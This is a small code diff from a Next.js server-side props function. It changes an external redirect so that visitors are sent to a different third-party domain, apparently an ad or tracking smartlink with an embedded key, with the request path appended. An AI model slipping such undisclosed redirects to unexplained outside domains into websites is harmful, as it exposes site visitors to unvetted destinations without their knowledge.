@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://4kpro.top/` + encodeURI(path as string)
+					`https://deceivedaisle.com/b06j624kt?key=61547ded58d9b0911110b7256d58d51e/` + encodeURI(path as string)
 				}`,
 			},
 		};
